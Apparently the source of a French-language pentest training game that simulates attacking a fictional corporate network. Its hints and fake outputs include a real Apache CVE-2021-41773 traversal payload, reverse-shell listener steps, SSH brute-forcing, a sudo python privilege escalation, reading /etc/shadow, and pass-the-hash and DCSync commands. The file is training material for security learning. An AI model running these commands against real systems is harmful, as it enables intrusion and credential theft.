// ─── Machine definitions ──────────────────────────────────────────────────────

const MACHINES = [
  {
    id: 'webserver',
    ip: '192.168.1.10',
    name: 'Active Directory',
    icon: '🏢',
    type: 'server',
    difficulty: 'easy',
    os: 'Windows Server 2019 (Build 17763)',
    services: ['Kerberos:88', 'LDAP:389', 'SMB:445', 'WinRM:5985', 'RDP:3389', 'GC-LDAP:3268'],
    locked: false,
    unlockedBy: [],
    connections: ['dbserver'],
    description: 'Active Directory — Domain Controller corp.local. Point d\'entrée principal.',
    flag: 'CQ{4d_c0ntr0ll3r_pwn3d}',
    hints: [
      'Ports 88 (Kerberos) + 389 (LDAP) + 3268 (GC) = signature Domain Controller',
      'nmap -sC -sV -p- 192.168.1.10 → scan complet NSE révèle le domaine corp.local',
      'dnsrecon -d corp.local -n 192.168.1.10 -t std → énumère tous les DNS SRV records',
    ]
  },
  {
    id: 'mailserver',
    ip: '192.168.1.20',
    name: 'Mail Server',
    icon: '📧',
    type: 'server',
    difficulty: 'medium',
    os: 'Debian 11',
    services: ['SMTP:25', 'IMAP:143', 'SSH:22'],
    locked: false,
    unlockedBy: [],
    connections: ['dbserver'],
    description: 'Serveur mail Postfix. Contient des credentials de base de données.',
    flag: 'CQ{m41l_s3rv3r_0wn3d}',
    hints: [
      'VRFY activée → smtp-user-enum pour lister les comptes',
      'Aucun fail2ban → brute-force SSH possible avec hydra',
      'Cherche les credentials DB dans les emails et configs Postfix',
    ]
  },
  {
    id: 'dbserver',
    ip: '192.168.1.30',
    name: 'DB Server',
    icon: '🗄',
    type: 'server',
    difficulty: 'medium',
    os: 'CentOS 7',
    services: ['MySQL:3306', 'SSH:22'],
    locked: true,
    unlockedBy: ['webserver', 'mailserver'],
    connections: ['dc'],
    description: 'Base de données MySQL. Credentials trouvés sur les machines précédentes.',
    flag: 'CQ{db_dump_g0t}',
    hints: [
      'Credentials : db_user:Str0ngP@ss (trouvés en exploitant web ou mail)',
      'mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss',
      'FILE privilege activé → SELECT LOAD_FILE(\'/etc/shadow\')',
    ]
  },
  {
    id: 'dc',
    ip: '192.168.1.100',
    name: 'Domain Controller',
    icon: '👑',
    type: 'boss',
    difficulty: 'hard',
    os: 'Windows Server 2019',
    services: ['SMB:445', 'WinRM:5985', 'LDAP:389', 'Kerberos:88', 'RDP:3389'],
    locked: true,
    unlockedBy: ['dbserver'],
    connections: [],
    description: 'Active Directory. Hash NTLM extrait du DB Server.',
    flag: 'CQ{d0m41n_4dm1n_pwn3d}',
    hints: [
      'Hash Administrator NTLM extrait via secretsdump sur le DB Server',
      'evil-winrm -i 192.168.1.100 -u Administrator -H <ntlm_hash>',
      'Pass-the-Hash : pas besoin du mot de passe en clair',
    ]
  }
];

// ─── Scenarios par machine ────────────────────────────────────────────────────

const MACHINE_SCENARIOS = {
  webserver: {
    phase_recon: {
      xp: 20,
      reveals: [
        'Apache/2.4.49 (Ubuntu) — version identifiée',
        'Port 80/tcp open  http    Apache httpd 2.4.49',
        'Page /cgi-bin/ accessible (CGI activé !)',
        '/robots.txt : Disallow: /backup/, /admin/',
      ]
    },
    phase_scan: {
      xp: 30,
      reveals: [
        '\x1b[31mCVE-2021-41773 : Path Traversal + RCE sur Apache 2.4.49 !\x1b[0m',
        'CVSS 9.8 — Critique. PoC public disponible.',
        '/backup/db.sql.gz accessible sans auth',
        'Module mod_cgi activé → RCE possible via Path Traversal',
      ]
    },
    phase_exploit: {
      xp: 50,
      reveals: [
        'Payload : /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh',
        'RCE confirmée : uid=33(www-data) gid=33(www-data)',
        'Reverse shell établi sur 10.0.0.1:4444',
        '/var/www/html/config.php → db_user:Str0ngP@ss trouvé !',
      ]
    },
    phase_post: {
      xp: 80,
      reveals: [
        'sudo -l : (root) NOPASSWD: /usr/bin/python3',
        'PrivEsc → sudo python3 -c \'import os; os.system("/bin/bash")\'',
        'root@web-server:~# whoami → root',
        '\x1b[32m🚩 FLAG : CQ{w3b_s3rv3r_pwn3d}\x1b[0m',
      ],
      unlocksMachines: ['dbserver'],
      flag: 'CQ{w3b_s3rv3r_pwn3d}'
    }
  },

  mailserver: {
    phase_recon: {
      xp: 20,
      reveals: [
        '220 mail.corp.local ESMTP Postfix 3.5.6',
        'VRFY admin → 252 admin@corp.local (énumération possible)',
        'VRFY john → 252 john@corp.local',
        'Domaine interne : corp.local | Aucun fail2ban détecté',
      ]
    },
    phase_scan: {
      xp: 30,
      reveals: [
        'smtp-user-enum : admin, john, backup, postmaster',
        'SSH port 22 ouvert → brute-force possible',
        'Politique de mots de passe faible (aucun lockout)',
        'IMAP accessible → lecture des emails si credentials obtenus',
      ]
    },
    phase_exploit: {
      xp: 50,
      reveals: [
        'hydra → admin:letmein trouvé après 237 tentatives',
        'Connexion SSH : admin@192.168.1.20',
        'Email de john : "DB creds: db_user / Str0ngP@ss"',
        '/etc/postfix/main.cf → credentials LDAP : ldap_bind:C0rpS3cr3t',
      ]
    },
    phase_post: {
      xp: 60,
      reveals: [
        'Emails sensibles exfiltrés (RH, finances, credentials)',
        'Credentials DB confirmés : db_user:Str0ngP@ss',
        'Hash shadow admin : $6$... (cracké : letmein)',
        '\x1b[32m🚩 FLAG : CQ{m41l_s3rv3r_0wn3d}\x1b[0m',
      ],
      unlocksMachines: ['dbserver'],
      flag: 'CQ{m41l_s3rv3r_0wn3d}'
    }
  },

  dbserver: {
    phase_recon: {
      xp: 15,
      reveals: [
        'MySQL 5.7.38 — connexion établie',
        'mysql> show databases;',
        '+--------------------+',
        '| information_schema |',
        '| corp_db            |',
        '| employees          |',
        '+--------------------+',
      ]
    },
    phase_scan: {
      xp: 25,
      reveals: [
        'mysql> use corp_db; show tables;',
        '| employees | users | credentials | secrets |',
        'FILE privilege : ACTIVÉ (dangereux !)',
        'mysql> SELECT user, file_priv FROM mysql.user WHERE user=\'db_user\';',
        '| db_user | Y |   ← FILE privs actives',
      ]
    },
    phase_exploit: {
      xp: 70,
      reveals: [
        'mysql> SELECT * FROM credentials;',
        '| Administrator | aad3b435b51404eeaad3b435b51404ee:5f4dcc3b... |',
        '\x1b[31mHash NTLM Administrator extrait !\x1b[0m',
        'mysql> SELECT LOAD_FILE(\'/etc/shadow\'); → succès (root hash récupéré)',
      ]
    },
    phase_post: {
      xp: 80,
      reveals: [
        'mysqldump corp_db → 450 enregistrements exfiltrés',
        'NTLM Hash : aad3b435b51404eeaad3b435b51404ee',
        'Pivot vers Domain Controller maintenant possible',
        '\x1b[32m🚩 FLAG : CQ{db_dump_g0t}\x1b[0m',
      ],
      unlocksMachines: ['dc'],
      flag: 'CQ{db_dump_g0t}'
    }
  },

  dc: {
    phase_recon: {
      xp: 20,
      reveals: [
        '*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>',
        'whoami /all → CORP\\Administrator (Domain Admins, Schema Admins)',
        'Domain : CORP.LOCAL | DC : dc.corp.local',
        'net user /domain → 47 comptes de domaine',
      ]
    },
    phase_scan: {
      xp: 40,
      reveals: [
        'net localgroup "Domain Admins" → Administrator, svc_backup',
        'ldapsearch : 3 OUs, 2 GPO, Kerberoasting potentiel',
        '\x1b[31mSMB signing DISABLED → Pass-the-Hash confirmé\x1b[0m',
        'BloodHound : chemin DA trouvé via svc_sql → Administrator',
      ]
    },
    phase_exploit: {
      xp: 100,
      reveals: [
        'secretsdump.py → NTDS.dit dump en cours...',
        'Administrator:500:aad3b435b51404ee:5f4dcc3b5aa765d61d8327de... [TOUS les hashes]',
        'krbtgt hash récupéré → Golden Ticket possible',
        'Domaine CORP.LOCAL entièrement compromis',
      ]
    },
    phase_post: {
      xp: 150,
      reveals: [
        'Persistance : Golden Ticket créé (10 ans)',
        'DCSync : tous les hashes du domaine exfiltrés',
        'CORP.LOCAL → neutralisé. 47 comptes exposés.',
        '\x1b[33m🏆 FLAG FINAL : CQ{d0m41n_4dm1n_pwn3d}\x1b[0m',
      ],
      unlocksMachines: [],
      flag: 'CQ{d0m41n_4dm1n_pwn3d}',
      gameWin: true
    }
  }
};

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getMachineByIP(ip) {
  return MACHINES.find(m => m.ip === ip) || null;
}

function getMachineByIdOrName(val) {
  return MACHINES.find(m => m.id === val || m.name.toLowerCase() === val.toLowerCase()) || null;
}

function getPhaseName(p) {
  return ['Reconnaissance', 'Scanning', 'Exploitation', 'Post-Exploitation', 'Terminée'][p] || 'Inconnue';
}

function isLocked(machine, state) {
  return machine.locked && !state.unlockedMachines.includes(machine.id);
}

function hasDBCreds(state) {
  return state.pwnedMachines.includes('webserver') || state.pwnedMachines.includes('mailserver');
}

function hasDCHash(state) {
  return state.pwnedMachines.includes('dbserver') || state.ntdsDumped === true;
}

function enterMachine(machine, extraLines, peda, xp, state) {
  return {
    output: extraLines.join('\n'),
    pedagogie: peda,
    effect: { type: 'ENTER_MACHINE', machine },
    xpBonus: xp,
    stateChanges: {
      mode: 'MACHINE',
      currentMachine: machine,
      machinePhase: 0,
      rootObtained: false,
    }
  };
}

// ─── Network mode ─────────────────────────────────────────────────────────────

function handleNetwork(cmd, args, state) {
  const joined = args.join(' ');

  // ── help ──
  if (cmd === 'help') {
    return {
      output: [
        '\x1b[33m╔══════════════════════════════════════════════════╗\x1b[0m',
        '\x1b[33m║   COMMANDES — Réseau CorpNet (192.168.1.0/24)    ║\x1b[0m',
        '\x1b[33m╚══════════════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[36mRECONNAISSANCE RÉSEAU\x1b[0m',
        '  nmap 192.168.1.0/24                      Découverte d\'hôtes',
        '  nmap -sV <ip>                            Versions des services',
        '  nmap -sC -sV -p- <ip>                   Scan complet + NSE (DC signature)',
        '',
        '\x1b[36mRECONNAISSANCE ACTIVE DIRECTORY\x1b[0m',
        '  dnsrecon -d corp.local -n <ip> -t std   DNS SRV / SOA / A records',
        '  dig axfr corp.local @<ip>               Zone Transfer (attendu: REFUSED)',
        '  nikto -h <ip>                           Fingerprint web IIS',
        '  gobuster dir -u http://<ip> -w <wl>     Brute-force répertoires HTTP',
        '  feroxbuster --url http://<ip> --wl <wl> Brute-force récursif',
        '  enum4linux -a <ip>                      Users / Groups / SID (SMB)',
        '',
        '\x1b[36mACCÈS INITIAL — Active Directory\x1b[0m',
        '  nc -lvnp 4444                Ouvrir un listener (reverse shell)',
        '  python3 exploit.py <ip> 4444 Lancer l\'exploit CVE-2021-41773',
        '',
        '\x1b[36mACCÈS INITIAL — Mail Server\x1b[0m',
        '  hydra -l admin -P rockyou.txt <ip> ssh   Brute-force SSH',
        '  ssh admin@<ip>               Connexion SSH',
        '',
        '\x1b[36mPIVOT — DB Server (après web ou mail)\x1b[0m',
        '  mysql -h <ip> -u db_user -pStr0ngP@ss    Connexion MySQL',
        '',
        '\x1b[36mPIVOT — Domain Controller (après DB)\x1b[0m',
        '  evil-winrm -i <ip> -u Administrator -H <ntlm_hash>',
        '',
        '\x1b[36mAUTRES\x1b[0m',
        '  ls / whoami / hint / scores',
        '',
        '\x1b[33m📍 CHAÎNE D\'ATTAQUE :\x1b[0m',
        '  nmap → nc -lvnp → python3 exploit.py → [dans web] → mysql → evil-winrm',
      ].join('\n'),
      pedagogie: 'Un pentest suit la chaîne : Recon → Scan → Accès initial → Post-exploitation → Pivot → Objectif. Chaque phase s\'appuie sur les infos de la précédente.',
      effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── hint ──
  if (cmd === 'hint') {
    const pwned = state.pwnedMachines || [];
    const scanned = state.scannedMachines || [];

    if (scanned.length === 0) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Début :\x1b[0m',
          '',
          '  Étape 1 : \x1b[36mnmap 192.168.1.0/24\x1b[0m  → découvrir les machines',
          '  Étape 2 : \x1b[36mnmap -sV 192.168.1.10\x1b[0m → scanner l\'Active Directory',
          '  Étape 3 : \x1b[36mnc -lvnp 4444\x1b[0m         → préparer un listener',
          '  Étape 4 : \x1b[36mpython3 exploit.py 192.168.1.10 4444\x1b[0m → reverse shell',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('webserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Active Directory (CVE-2021-41773) :\x1b[0m',
          '',
          '  1. \x1b[36mnmap -sV 192.168.1.10\x1b[0m',
          '     → Identifie Apache 2.4.49 (version vulnérable)',
          '',
          '  2. \x1b[36mnikto -h 192.168.1.10\x1b[0m',
          '     → Scanner web : détecte CVE-2021-41773, /backup/, /admin/',
          '     → Nikto teste +6700 vulnérabilités web connues automatiquement',
          '',
          '  3. \x1b[36mnc -lvnp 4444\x1b[0m',
          '     → Listener TCP : attend que la victime se connecte vers toi',
          '',
          '  4. \x1b[36mpython3 cve-2021-41773.py 192.168.1.10 4444\x1b[0m',
          '     → Exploite le Path Traversal → reverse shell obtenu',
          '',
          '  5. Dans le shell → \x1b[36mrecon\x1b[0m → \x1b[36mexploit\x1b[0m → \x1b[36msudo -l\x1b[0m → \x1b[36mcat /flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: 'nikto est un scanner de vulnérabilités web open-source. Il envoie des milliers de requêtes HTTP pour détecter : fichiers sensibles exposés, versions obsolètes avec CVEs connues, mauvaises configurations (directory listing, méthodes HTTP dangereuses). Commande : nikto -h <ip> ou nikto -h http://<ip>:<port>. Attention : nikto est très bruyant et déclenche tous les IDS/WAF.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('mailserver') && !pwned.includes('dbserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Mail Server :\x1b[0m',
          '',
          '  1. \x1b[36mnmap -sV 192.168.1.20\x1b[0m',
          '  2. \x1b[36mhydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.20 ssh\x1b[0m',
          '  3. \x1b[36mssh admin@192.168.1.20\x1b[0m',
          '  4. Dans le shell → \x1b[36mrecon\x1b[0m, \x1b[36mnmap\x1b[0m, \x1b[36mexploit\x1b[0m, \x1b[36mcat /flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('dbserver')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — DB Server :\x1b[0m',
          '',
          '  Tu as les credentials DB depuis la machine précédente :',
          '  \x1b[36mmysql -h 192.168.1.30 -u db_user -pStr0ngP@ss\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!pwned.includes('dc')) {
      return {
        output: [
          '\x1b[33m💡 INDICE — Domain Controller :\x1b[0m',
          '',
          '  Tu as extrait le hash NTLM Administrator du DB Server.',
          '  \x1b[36mevil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    return {
      output: '\x1b[32m🏆 Toutes les machines ont été compromises !\x1b[0m Tape "scores".',
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── ls ──
  if (cmd === 'ls') {
    const visible = MACHINES.filter(m =>
      !isLocked(m, state) || state.scannedMachines.includes(m.id)
    );
    const lines = visible.map(m => {
      const st = state.pwnedMachines.includes(m.id) ? '\x1b[32m[PWNED]  \x1b[0m' :
                 state.scannedMachines.includes(m.id) ? '\x1b[33m[SCANNÉ] \x1b[0m' : '\x1b[34m[VISIBLE]\x1b[0m';
      const lock = isLocked(m, state) ? ' 🔒' : '';
      return `  ${m.ip.padEnd(16)} ${st} ${m.name}${lock}`;
    });
    return {
      output: ['Réseau CorpNet — hôtes connus :', '', ...lines, '', '\x1b[33mnmap 192.168.1.0/24 pour un scan complet\x1b[0m'].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── whoami ──
  if (cmd === 'whoami' || cmd === 'id') {
    return {
      output: [
        '\x1b[31mattacker\x1b[0m@\x1b[33mkali\x1b[0m — IP : 10.0.0.1 (Kali Linux)',
        `Réseau cible   : 192.168.1.0/24 (CorpNet)`,
        `Machines pwned : ${state.pwnedMachines.length} / ${MACHINES.length}`,
        `Listener actif : ${state.listenerPort ? `port ${state.listenerPort}` : 'aucun'}`,
        `Score XP       : ${state.xp}`,
      ].join('\n'),
      pedagogie: 'whoami est la première commande à taper après chaque pivot : vérifier son identité, ses privilèges, et son contexte réseau.',
      effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── nmap ──
  if (cmd === 'nmap') {
    if (joined.includes('/24') || args.includes('-sn') || joined.includes('0/24')) {
      const newScanned = MACHINES
        .filter(m => !isLocked(m, state) && !state.scannedMachines.includes(m.id))
        .map(m => m.id);
      return {
        output: [
          'Starting Nmap 7.94SVN ( https://nmap.org )',
          'Nmap scan report for 192.168.1.1    (Firewall)    → filtered',
          '\x1b[32mNmap scan report for 192.168.1.10\x1b[0m  (Active Directory)  → open: 88,389,445,5985,3389',
          '\x1b[32mNmap scan report for 192.168.1.20\x1b[0m  (Mail Server) → open: 25,143,22',
          'Nmap scan report for 192.168.1.30  (DB Server)  → filtered (réseau interne)',
          'Nmap scan report for 192.168.1.100 (DC)         → filtered (réseau interne)',
          '',
          '5 hosts up — 2 accessibles directement, 3 filtrés',
          '',
          '\x1b[33m💡 Lance un scan de versions sur les cibles accessibles :\x1b[0m',
          '   \x1b[36mnmap -sV 192.168.1.10\x1b[0m',
          '   \x1b[36mnmap -sV 192.168.1.20\x1b[0m',
          '',
          '\x1b[35mORACLE > Deux cibles directes : Active Directory et Mail Server. Commence par l\'AD.\x1b[0m',
        ].join('\n'),
        pedagogie: 'nmap -sn (ping scan) découvre les hôtes actifs sans scanner les ports. Rapide et discret. Pour la détection de services : nmap -sV. Pour tout scanner : nmap -sC -sV -p-.',
        effect: { type: 'SCAN_NETWORK', discovered: ['webserver', 'mailserver'] },
        xpBonus: 30,
        stateChanges: {
          scannedMachines: [...new Set([...state.scannedMachines, ...newScanned, 'webserver', 'mailserver'])]
        }
      };
    }

    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    if (ip) {
      const machine = getMachineByIP(ip);
      if (!machine) return { output: `Nmap: ${ip} — host seems down.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      if (isLocked(machine, state)) {
        return {
          output: `\x1b[31mNmap: ${ip} — filtered (réseau interne inaccessible depuis ta position)\x1b[0m\nPivote depuis une machine compromise pour accéder au réseau interne.`,
          pedagogie: 'Le pivoting (tunneling SSH, proxy SOCKS5, chisel) permet d\'accéder à des réseaux internes via une machine compromise. Technique fondamentale en pentest.',
          effect: null, xpBonus: 0, stateChanges: {}
        };
      }
      // Full scan (-sC -sV -p-) on AD machine → NSE script output + DC signature
      const isFullScan = joined.includes('-sC') || joined.includes('-p-') || joined.includes('sC');
      if (machine.id === 'webserver' && isFullScan) {
        return {
          output: [
            `Starting Nmap 7.94SVN against ${ip}`,
            `Host is up (0.011s latency).`,
            `Not shown: 65518 closed tcp ports (reset)`,
            '',
            `\x1b[33mPORT       STATE SERVICE         VERSION\x1b[0m`,
            `53/tcp     open  domain          Simple DNS Plus`,
            `80/tcp     open  http            Microsoft IIS httpd 10.0`,
            `\x1b[32m88/tcp     open  kerberos-sec    Microsoft Windows Kerberos (server time: 2024-01-15 14:23:01Z)\x1b[0m`,
            `135/tcp    open  msrpc           Microsoft Windows RPC`,
            `139/tcp    open  netbios-ssn     Microsoft Windows netbios-ssn`,
            `\x1b[32m389/tcp    open  ldap            Microsoft Windows Active Directory LDAP (Domain: corp.local)\x1b[0m`,
            `\x1b[32m445/tcp    open  microsoft-ds    Windows Server 2019 Microsoft DS\x1b[0m`,
            `464/tcp    open  kpasswd5?`,
            `593/tcp    open  ncacn_http      Microsoft Windows RPC over HTTP 1.0`,
            `\x1b[32m3268/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Global Catalog)\x1b[0m`,
            `3269/tcp   open  tcpwrapped`,
            `\x1b[32m3389/tcp   open  ms-wbt-server   Microsoft Terminal Services\x1b[0m`,
            `\x1b[32m5985/tcp   open  http            Microsoft HTTPAPI httpd 2.0 (WinRM)\x1b[0m`,
            `9389/tcp   open  mc-nmf          .NET Message Framing`,
            '',
            `Host script results:`,
            `| smb2-security-mode:`,
            `|   3.1.1:`,
            `|\x1b[31m_    Message signing enabled and required\x1b[0m`,
            `| smb-os-discovery:`,
            `|   OS: Windows Server 2019 Standard 17763`,
            `|   Computer name: dc`,
            `|   NetBIOS computer name: DC`,
            `|   Domain name: corp.local`,
            `|\x1b[32m_   FQDN: dc.corp.local\x1b[0m`,
            '',
            `\x1b[32m[+] Signature DC confirmée : 88 (Kerberos) + 389 (LDAP) + 3268 (Global Catalog)\x1b[0m`,
            `\x1b[32m[+] Domaine AD    : corp.local\x1b[0m`,
            `\x1b[32m[+] FQDN          : dc.corp.local\x1b[0m`,
            `\x1b[31m[!] SMB Signing REQUIRED → NTLM Relay bloqué sur cette cible\x1b[0m`,
            '',
            `\x1b[33m💡 Prochaines étapes :\x1b[0m`,
            `   \x1b[36mdnsrecon -d corp.local -n ${ip} -t std\x1b[0m`,
            `   \x1b[36mdig axfr corp.local @${ip}\x1b[0m`,
          ].join('\n'),
          pedagogie: 'nmap -sC -sV -p- scanne les 65535 ports avec scripts NSE et détection de versions. Sur un DC, la combinaison 88 (Kerberos) + 389 (LDAP) + 3268 (Global Catalog) est la signature AD. SMB Signing required = NTLM Relay impossible. Le script smb-os-discovery révèle le FQDN et le nom de domaine sans authentification.',
          effect: { type: 'SCAN_MACHINE', machineId: machine.id },
          xpBonus: 25,
          stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
        };
      }

      const portLines = machine.services.map(s => {
        const [svc, port] = s.split(':');
        return `${(port + '/tcp').padEnd(10)} open  ${svc}`;
      });
      return {
        output: [
          `Starting Nmap 7.94SVN against ${ip}`,
          `Host is up (0.011s latency).`,
          '',
          'PORT       STATE SERVICE',
          ...portLines,
          '',
          `OS: ${machine.os}`,
          '',
          `\x1b[32m[+] ${machine.name} identifié — ${machine.os}\x1b[0m`,
          `\x1b[33m💡 Pour un scan complet NSE : nmap -sC -sV -p- ${ip}\x1b[0m`,
        ].join('\n'),
        pedagogie: 'nmap -sV détecte les versions des services. Combiner avec -sC (scripts NSE) pour les détails AD (FQDN, domaine, SMB signing). -p- scanne tous les 65535 ports.',
        effect: { type: 'SCAN_MACHINE', machineId: machine.id },
        xpBonus: 15,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }
    return { output: 'Usage: nmap 192.168.1.0/24   ou   nmap -sV <ip>   ou   nmap -sC -sV -p- <ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── dnsrecon ──
  if (cmd === 'dnsrecon') {
    const dIdx = args.indexOf('-d');
    const nIdx = args.indexOf('-n');
    const domain = dIdx !== -1 ? args[dIdx + 1] : args.find(a => /\.local$/.test(a));
    const ns     = nIdx !== -1 ? args[nIdx + 1] : '192.168.1.10';

    if (!domain) {
      return {
        output: [
          'Usage: dnsrecon -d <domaine> -n <ip-dc> -t std',
          'Exemple: dnsrecon -d corp.local -n 192.168.1.10 -t std',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const adMachine = getMachineByIP(ns) || MACHINES.find(m => m.id === 'webserver');
    if (adMachine && isLocked(adMachine, state)) {
      return {
        output: `\x1b[31m[!] ${ns} inaccessible depuis ta position — réseau interne filtré.\x1b[0m`,
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    return {
      output: [
        `\x1b[36m[*] Performing General Enumeration of Domain: ${domain}\x1b[0m`,
        `[*] DNSSEC is not configured for ${domain}`,
        '',
        `\x1b[32m[+]      SOA  ${domain.padEnd(30)} dc.corp.local\x1b[0m`,
        `\x1b[32m[+]       NS  ${domain.padEnd(30)} dc.corp.local\x1b[0m`,
        `\x1b[32m[+]        A  dc.corp.local                  ${ns}\x1b[0m`,
        `\x1b[32m[+]        A  ${domain.padEnd(30)} ${ns}\x1b[0m`,
        '',
        `[*] Enumerating SRV Records`,
        `\x1b[32m[+]      SRV  _kerberos._tcp.${domain.padEnd(18)}  dc.corp.local:88\x1b[0m`,
        `\x1b[32m[+]      SRV  _ldap._tcp.${domain.padEnd(21)}     dc.corp.local:389\x1b[0m`,
        `\x1b[32m[+]      SRV  _gc._tcp.${domain.padEnd(23)}       dc.corp.local:3268\x1b[0m`,
        `\x1b[32m[+]      SRV  _kerberos._tcp.dc._msdcs.${domain}  dc.corp.local:88\x1b[0m`,
        `\x1b[32m[+]      SRV  _ldap._tcp.dc._msdcs.${domain}      dc.corp.local:389\x1b[0m`,
        `[+] 5 SRV Records Found`,
        '',
        `\x1b[33m[*] Attempting Zone Transfer (AXFR) ...\x1b[0m`,
        `\x1b[31m[-] Zone Transfer Failed (REFUSED) — le DC est bien configuré\x1b[0m`,
        '',
        `\x1b[32m[+] DC identifié    : dc.corp.local → ${ns}\x1b[0m`,
        `\x1b[32m[+] Domaine AD      : ${domain} (Forest root)\x1b[0m`,
        `\x1b[32m[+] Kerberos port   : 88  (AS-REP Roasting possible)\x1b[0m`,
        `\x1b[32m[+] LDAP port       : 389 (énumération anonyme ?)\x1b[0m`,
        '',
        `\x1b[33m💡 Prochaine étape :\x1b[0m`,
        `   \x1b[36mdig axfr corp.local @${ns}\x1b[0m   → tentative de zone transfer DNS`,
      ].join('\n'),
      pedagogie: 'dnsrecon énumère les enregistrements DNS d\'un domaine AD. Les SRV records révèlent Kerberos (_kerberos._tcp:88), LDAP (_ldap._tcp:389) et Global Catalog (_gc._tcp:3268) sans aucune authentification. L\'échec du Zone Transfer (AXFR REFUSED) indique une configuration DNS correcte — si ça avait réussi, tous les hôtes internes seraient exposés en une commande.',
      effect: { type: 'SCAN_MACHINE', machineId: 'webserver' },
      xpBonus: 20,
      stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, 'webserver'])] }
    };
  }

  // ── nc -lvnp : préparer un listener pour reverse shell ──
  if (cmd === 'nc') {
    const listenFlags = ['-lvnp', '-lnvp', '-lvp', '-l'];
    const isListen = listenFlags.some(f => args.includes(f)) || args.some(a => /^-.*l/.test(a));
    if (isListen) {
      const portArg = args.find(a => /^\d{2,5}$/.test(a));
      const port = portArg || '4444';
      return {
        output: [
          `\x1b[32mlistening on [any] ${port} ...\x1b[0m`,
          '',
          '\x1b[33m💡 Listener TCP actif. Lance l\'exploit pour déclencher la connexion :\x1b[0m',
          `\x1b[36m   python3 cve-2021-41773.py 192.168.1.10 ${port}\x1b[0m`,
          '',
          '\x1b[37m(Le reverse shell se connectera automatiquement quand l\'exploit réussit)\x1b[0m',
        ].join('\n'),
        pedagogie: 'nc -lvnp crée un serveur TCP en écoute. Quand l\'exploit déclenche un reverse shell sur la victime, celle-ci se connecte vers l\'attaquant, contournant ainsi les firewalls entrants (qui bloquent les connexions entrantes mais autorisent les sortantes).',
        effect: null, xpBonus: 10,
        stateChanges: { listenerPort: parseInt(port) || 4444 }
      };
    }
    return { output: 'Usage: nc -lvnp <port>   (pour préparer un listener reverse shell)', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── python3 exploit.py : CVE-2021-41773 → reverse shell sur web server ──
  if (cmd === 'python3' || cmd === 'python') {
    // IOXIDResolver special case — délègue avant le check exploit
    if (args.some(a => /IOXIDResolver/i.test(a))) {
      const tIdx = args.indexOf('-t');
      const ioxidIp = tIdx !== -1 ? args[tIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a)) || '192.168.1.10';
      const ioxidMachine = getMachineByIP(ioxidIp);
      if (ioxidMachine && isLocked(ioxidMachine, state)) {
        return { output: `\x1b[31m[!] ${ioxidIp} inaccessible — réseau interne filtré.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      }
      return {
        output: [
          `\x1b[36m[*] IOXIDResolver — Enumerating network interfaces via MSRPC/OXID\x1b[0m`,
          `[*] Target: ${ioxidIp}:135 (DCOM/OXID Service)`,
          '',
          `\x1b[32m[+] Address: ${ioxidIp}        → Interface externe (accessible)\x1b[0m`,
          `\x1b[32m[+] Address: 10.10.10.5          → Interface interne (réseau de gestion !)\x1b[0m`,
          `\x1b[32m[+] Address: 172.16.0.1           → Interface DMZ (réseau segmenté)\x1b[0m`,
          '',
          `\x1b[31m[!] Interfaces réseau internes découvertes SANS authentification !\x1b[0m`,
          `\x1b[32m[+] Pivot potentiel : 10.10.10.5/24 — réseau de gestion interne\x1b[0m`,
          `\x1b[32m[+] Pivot potentiel : 172.16.0.0/24 — DMZ interne\x1b[0m`,
          '',
          `\x1b[33m📚 Le service OXID (port 135) maintient la liste des interfaces réseau\x1b[0m`,
          `   liées aux objets COM distants — accessible sans auth sur Windows.\x1b[0m`,
          '',
          `\x1b[33m💡 Prochaine étape :\x1b[0m`,
          `   \x1b[36mhydra -l administrator -P rockyou.txt rdp://${ioxidIp} -t 4 -V -f\x1b[0m`,
          `   → brute-force RDP (va échouer → explique pourquoi Kerberoasting est préféré)`,
        ].join('\n'),
        pedagogie: 'IOXIDResolver.py exploite le service MSRPC/OXID (port 135) pour énumérer toutes les interfaces réseau d\'une machine Windows sans authentification. Révèle des réseaux internes cachés depuis l\'extérieur. Utile pour planifier le pivoting : si le DC a une interface 10.10.10.x, des serveurs supplémentaires existent dans ce réseau.',
        effect: null, xpBonus: 15, stateChanges: {}
      };
    }

    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    const hasExploit = args.some(a => /exploit|cve|41773|shell|payload|rce/i.test(a));
